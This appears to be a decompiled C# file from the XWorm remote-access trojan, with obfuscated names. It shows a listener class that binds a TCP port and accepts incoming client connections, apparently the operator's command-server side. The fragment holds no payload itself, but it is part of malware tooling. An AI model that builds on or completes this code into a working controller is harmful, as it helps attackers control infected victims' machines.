#define DEBUG
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm;

public class GClass8
{
	public Socket socket_0;

	public ManualResetEvent manualResetEvent_0;

	public GClass8()
	{
		manualResetEvent_0 = new ManualResetEvent(initialState: false);
	}

	public void method_0(int Port)
	{
		try
		{
			socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Port);
			socket_0.ReceiveBufferSize = 51200;
			socket_0.SendBufferSize = 51200;
			socket_0.Bind(localEP);
			socket_0.Listen(500);
			socket_0.BeginAccept(method_1, null);
			if (GClass19.bool_0)
			{
				MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "SocketStarted.. " + Conversions.ToString(Port);
				MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1(IAsyncResult ar)
	{
		try
		{
			new GClass5(socket_0.EndAccept(ar));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debug.WriteLine("EndAccept " + ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			socket_0.BeginAccept(method_1, null);
		}
	}
}